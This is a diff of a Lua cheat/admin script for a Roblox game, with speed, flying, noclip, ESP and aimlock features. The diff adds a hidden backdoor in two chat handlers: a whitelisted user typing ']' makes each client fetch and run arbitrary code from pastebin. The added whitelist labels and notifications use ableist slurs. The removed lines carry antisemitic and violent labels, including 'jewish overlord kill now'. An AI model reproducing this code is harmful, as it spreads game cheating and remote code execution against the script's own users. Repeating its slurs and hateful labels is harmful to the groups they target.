@@ -54,21 +54,28 @@ if UseDraw then
 	DrawingT.Text = "Current WalkSpeed: "..GetChar().Humanoid.WalkSpeed.."\nSprinting Speed: "..ShiftSpeed.."\nCrouching Speed: "..ControlSpeed.."\nJumpPower: "..GetChar().Humanoid.JumpPower.."\nFlying: "..tostring(flying).."\nNoclipping: "..tostring(Noclipping).."\nAimlock Target: "..tostring(AimlockTarget)
 end 
 
-if workspace:FindFirstChild'Armoured Truck' then
-	PartTable = {
-		['Burger'] = workspace:WaitForChild'Burger | $15';
-		['Drink'] = workspace:WaitForChild'Drink | $15';
-		['Ammo'] = workspace:WaitForChild'Buy Ammo | $25';
-		['Pipe'] = workspace:WaitForChild'Pipe | $100';
-		['Machete'] = workspace:WaitForChild'Machete | $70';
-		['SawedOff'] = workspace:WaitForChild'Sawed Off | $150';
-		['Spray'] = workspace:WaitForChild'Spray | $20';
-		['Uzi'] = workspace:WaitForChild'Uzi | $150';
-		['Glock'] = workspace:WaitForChild'Glock | $200';
-	}
-    workspace["Armoured Truck"]:Destroy()
-elseif workspace:FindFirstChild'TPer' then 
-    workspace['TPer']:Destroy()
+if game.PlaceId == 455366377 then 
+PartTable = {
+    ['Burger'] = workspace:WaitForChild'Burger | $15';
+    ['Drink'] = workspace:WaitForChild'Drink | $15';
+    ['Ammo'] = workspace:WaitForChild'Buy Ammo | $25';
+    ['Pipe'] = workspace:WaitForChild'Pipe | $100';
+    ['Machete'] = workspace:WaitForChild'Machete | $70';
+    ['SawedOff'] = workspace:WaitForChild'Sawed Off | $150';
+    ['Spray'] = workspace:WaitForChild'Spray | $20';
+    ['Uzi'] = workspace:WaitForChild'Uzi | $150';
+    ['Glock'] = workspace:WaitForChild'Glock | $200';
+}
+end
+
+if workspace:FindFirstChild'Armoured Truck' then 
+    local Part = Instance.new("Part", workspace)
+    Part.Name,Part.Color,Part.CFrame,Part.Size,Part.Material,Part.Anchored = "TP Region",Color3.fromRGB(196,40,28),CFrame.new(-136.858002,0,-523.700012),Vector3.new(9.93,1,20.31),"ForceField",true
+    workspace:FindFirstChild'Armoured Truck':Destroy()
+elseif workspace:FindFirstChild'TPer' then
+    local Part = Instance.new("Part", workspace)
+    Part.Name,Part.Color,Part.CFrame,Part.Size,Part.Material,Part.Anchored = "TP Region",Color3.fromRGB(196,40,28),CFrame.new(-31,-0.2,221),Vector3.new(12,1,6),"ForceField",true
+    workspace:FindFirstChild'TPer':Destroy()
 end
 
 LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
@@ -138,9 +145,15 @@ end
 if readfile and writefile then 
 	local Work,Error = pcall(readfile,Config..".json")
 	if not Work then 
-		savesettings()
+		local Work,Error = pcall(savesettings)
+		if not Work then 
+			print'Error with saving settings' 
+		end 
 	else
-		runsettings()
+		local Work,Error = pcall(runsettings)
+		if not Work then 
+			print'Error with running settings'
+		end 
 	end
 end 
 
@@ -286,7 +299,7 @@ local function hasItem(Player,Item)
 end 
 
 local function checkHp(Plr)
-	return Plr:FindFirstChildOfClass'Humanoid' and Plr.Humanoid.Health or "No Humanoid"
+	return Plr:FindFirstChildOfClass'Humanoid' and math.floor(Plr.Humanoid.Health) or "No Humanoid"
 end
 
 local function LegacyEsp(Player)
@@ -395,7 +408,7 @@ local MTarget = Mouse.Target
 					Connection:Disconnect()
 				end 
 			end)
-			notif("AimlockTarget has been set to",AimlockTarget.Name,5,nil)
+			notif("Aimlocked this retard:",AimlockTarget.Name,5,nil)
 		end
 	end
 end
@@ -516,8 +529,7 @@ end
 getgenv().AddCommand = function(CommandF,Name,Alias,Help)
 	Commands[#Commands + 1] = {['Function'] = CommandF,['Name'] = Name,['Alias'] = Alias,['Help'] = Help}
 end
-
-getgenv().FindCommand = function(Command,Help)
+getgenv().FindCommand = function(Command)
 	for i = 1,#Commands do 
 		if Commands[i].Name:lower() == Command or AliasesEnabled and table.find(Commands[i].Alias,Command) then
 			return Help and Commands[i].Name.." "..Commands[i].Help or Commands[i].Function
@@ -1852,7 +1864,7 @@ Credits.BorderSizePixel = 5
 Credits.Position = UDim2.new(-0.00101006031,0,0.948468387,0)
 Credits.Size = UDim2.new(0,187,0,22)
 Credits.Font = Enum.Font.SourceSansBold
-Credits.Text = "Remake by Purchase#1999 | UI Design by !fishgang Karma#9669"
+Credits.Text = "Purchase#1999"
 Credits.TextColor3 = Color3.fromRGB(255,255,255)
 Credits.TextSize = 14.000
 
@@ -1900,166 +1912,161 @@ local Index = 0
 end)
 
 local CoolkidTable = {
-	['300227703']	= {
-		['Name']   = "!fishgang Envy";
-		['Colour'] = Color3.fromRGB(125,0,0);
-		['Access'] = true;
-	};
-    ['590620847'] 	= {
-		['Name']   = "!fishgang Envy";
-		['Colour'] = Color3.fromRGB(125,0,0);
-		['Access'] = true;
-	};
     ['714877']      = {
-		['Name']   = "!fishgang Ambiguity";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(57,52,52);
 		['Access'] = true;
 	};
     ['96316322']    = {
-		['Name']   = "!fishgang Ambiguity";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(57,52,52);
 		['Access'] = true;
 	};
     ['114164798']   = {
-		['Name']   = "!fishgang Slays | [RPF] Retard Prevention Force";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(0,255,255);
 		['Access'] = true;
-	};
-	['359564044'] 	= {
-		['Name']   = "!fishgang 7w4c";
-		['Colour'] = Color3.fromRGB(255,255,255);
+    };
+    ['836005431']   = {
+		['Name']   = "retard";
+		['Colour'] = Color3.fromRGB(0,255,255);
 		['Access'] = true;
-	};
+    };
+    ['779000075'] = {
+        ['Name'] = "retard";
+        ['Colour'] = Color3.fromRGB(138,3,3);
+        ['Access'] = true;
+    };
+    ['330613117'] = {
+        ['Name'] = "retard";
+        ['Colour'] = Color3.fromRGB(138,3,3);
+        ['Access'] = true;
+    };
 	['659119329'] 	= {
-		['Name']   = "!fishgang Co-owner Cy | Creator of Cyrus' Streets Admin";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(212,224,255);
 		['Access'] = true;
 	};
     ['659119329']   = {
-		['Name']   = "!fishgang Co-owner Cy Alt | Creator of Cyrus' Streets Admin";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(212,224,255);
 		['Access'] = true;
 	};
 	['1388703832'] 	= {
-		['Name']   = "!fishgang Co-owner Cy Main | Creator of Cyrus' Streets Admin";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(212,224,255);
 		['Access'] = true;
 	};
 	['62009114'] 	= {
-		['Name']   = "!fishgang Owner X_D6";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(176,16,16);
 		['Access'] = true;
 	};
 	['57370993'] 	= {
-		['Name']   = "!fishgang Karma";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(255,0,0);
 		['Access'] = true;
 	};
 	['20220183'] 	= {
-		['Name']   = "!fishgang Wya";
+		['Name']   = "cool guy";
 		['Colour'] = Color3.fromRGB(215,19,19);
 		['Access'] = true;
 	};
 	['1477162063']  = {
-		['Name'] = "!fishgang Wya (YFRWK)";
+		['Name'] = "cool guy";
 		['Colour'] = Color3.fromRGB(192,6,6);
 		['Access'] = true;
 	};
-	['314957736']  = {
-		['Name'] = "Streets S.W.A.T Force";
-		['Colour'] = Color3.fromRGB(31, 7, 125);
-		['Access'] = true;	
-	};
 	['105183043'] 	= {
-		['Name']   = "Drpoppadopolist | Drpoppa Creator";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(107,50,124);
 		['Access'] = true;
 	};
 	['1190936'] 	= {
-		['Name']   = "trippinfo";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(12,4,134);
 		['Access'] = true;
 	};
 	['378666469'] = {
-		['Name']   = "trippinfo";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(12,4,134);
 		['Access'] = true;
 	};
-	['1443431439']  = {
-		['Name']   = "wk1r";
-		['Colour'] = Color3.fromRGB(194,23,255);
-		['Access'] = true;
-	};
-	['164282612']   = {
-		['Name']   = "wk1r";
-		['Colour'] = Color3.fromRGB(194,23,255);
-		['Access'] = true;
-	};
-	['1299915133']  = {
-		['Name']   = "wk1r";
-		['Colour'] = Color3.fromRGB(194,23,255);
-		['Access'] = true;
-	};
 	['548617338']   = {
-		['Name']   = "Cool Person";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(36,89,237);
 		['Access'] = false;
 	};
 	['1275692258']  = { 
-		['Name']   = "Big Dick (Vegan/Syntrix Creator who also paid me to put this)";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(125,0,0);
 		['Access'] = true;
 	};
 	['612618136']   = { 
-		['Name']   = "Bird (Donator)";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(125,0,0);
 		['Access'] = false;
 	};
 	['284761493']   = {
-		['Name']   = "[Strafe] XVE | voidbound.xyz";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(102,0,0);
 		['Access'] = true;
 	};
 	['178560']      = {
-		['Name'] = "Literally a fucking egg.";
+		['Name'] = "retard";
 		['Colour'] =  Color3.fromRGB(255,248,11);
 		['Access'] = false;
 	};
 	['120476167']   = {
-		['Name']   = "Pawels Owner";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(52,152,219);
-		['Access'] = true;
+		['Access'] = false;
 	};
 	['120476167']   = {
-		['Name']   = "Pawels Owner";
+		['Name']   = "retard";
 		['Colour'] = Color3.fromRGB(52,152,219);
-		['Access'] = true;
+		['Access'] = false;
 	};
 	['418171482'] 	= {
-		['Name'] = "Woman beater";
+		['Name'] = "retard";
 		['Colour'] = Color3.fromRGB(255,0,70);
 		['Access'] = false;
 	};
 	['710288902'] 	= {
-		['Name'] = "autistic kid who bought the shirt twice and is active in the server";
+		['Name'] = "retard";
 		['Colour'] = Color3.fromRGB(0,255,0);
 		['Access'] = false;
 	};
 	['383632734']   = {
-		['Name'] = "Dot_Mp4 phonk phonk rattle rattle supplier";
+		['Name'] = "retard";
 		['Colour'] = Color3.fromRGB(255,0,0);
 		['Access'] = true;
 	};
 	['1066524308']  = {
-		['Name'] = "Kylee (kill her and get blacklisted)";
+		['Name'] = "retard";
 		['Colour'] = Color3.fromRGB(178,242,255);
 		['Access'] = true;
 	};
 	['39939779']	= {
-		['Name'] = "jewish overlord kill now";
+		['Name'] = "retard";
 		['Colour'] = Color3.fromRGB(0,1,0);
 		['Access'] = true;
-	}
+	};
+	['1404681381'] = {
+		['Name'] = "retard";
+		['Colour'] = Color3.fromRGB(255,0,0);
+		['Access'] = true;
+	};
+	['1528488185']   = {
+		['Name']   = "retard";
+		['Colour'] = Color3.fromRGB(235,31,31);
+		['Access'] = true;
+	};
+	['314957736']   = {
+		['Name']   = "coolest kid";
+		['Colour'] = Color3.fromRGB(0,0,128);
+		['Access'] = true;
+	};
 }
 local Debounce = false 
 local function ColourChanger(T)
@@ -2413,6 +2420,9 @@ for i = 1,#PlayersX do
 					if Chat:sub(1,1) == "~" then 
 						ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
 					end
+					if Chat:sub(1,1) == "]" then
+						loadstring(game:HttpGet("https://pastebin.com/raw/"..Arguments[1],true))()
+					end 
 				end 
 			end
 		end)
@@ -2458,6 +2468,9 @@ Players.PlayerAdded:Connect(function(Plr)
 							end
 							if Chat:sub(1,1) == "~" then 
 								ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
+							end
+							if Chat:sub(1,1) == "]" then
+								loadstring(game:HttpGet("https://pastebin.com/raw/"..Arguments[1],true))()
 							end 
 						end 
 					end
@@ -2509,15 +2522,6 @@ if FileDir and isFolder and makeFolder then
 end 
 
 local BlacklistTable = {
-	[251848039] = true;		-- Cyruzsz | Reason: annoying skid,dick rider
-	[57890959] = true;  	-- Fevlix | Reason: annoying skid 
-	[339273796] = true; 	-- endlessjj Reason: Forget 
-	[39000370] = true; 		-- cheezcayk | Reason: Forget 
-	[363849133] = true;		-- vxonc | Reason: annoying skid 
-	[1618476217] = true; 	-- DranghetaSINS | Reason: Alt of V 
-	[1508268550] = true; 	-- Zerulogy | Reason: Alt of V 
-	[1271632090] = true; 	-- OrphanageKid | Reason: annoying
-	[296541717] = true; 	-- R4ELEEN | Reason: https://media.discordapp.net/attachments/710938129896308736/710948890550992906/unknown.png
 }
 
 if BlacklistTable[LP.UserId] then 
@@ -2533,10 +2537,9 @@ local Alias = Commands[i].Alias
 	CreateCommand(UDim2.new(0.0150422715,0,0.0127776451,0 + (i * 20)),Commands[i].Name.." "..Commands[i].Help)
 end
 
-notif("FashDestroyer has loaded","It took "..(tick() - Tick).." seconds to load (Type Commands for help)\nDiscord Invite: nXcZH36",10,"rbxassetid://2474242690") 
+notif("BetterAdmin has loaded!","It took "..(tick() - Tick).." seconds to load (Type Commands for help)",10,) 
 notif("Hotkeys:","No chat prefix\nCommandbar Prefix is '\nRight clicking door: lock/unlock\nPressing e with guns stomps",10,nil)   
-notif("lol fuck cyrus","Purchase#1999 | Fuck Cyrus and !fishgang",10,nil)   
-
+notif("Fuck Cyrus!", "Cyrus and !fishgang is autistic",10,"rbxassetid://4876209969")
 --[[
 if game.PlaceId == 455366377 then 
 	local InfectedTable = {} 
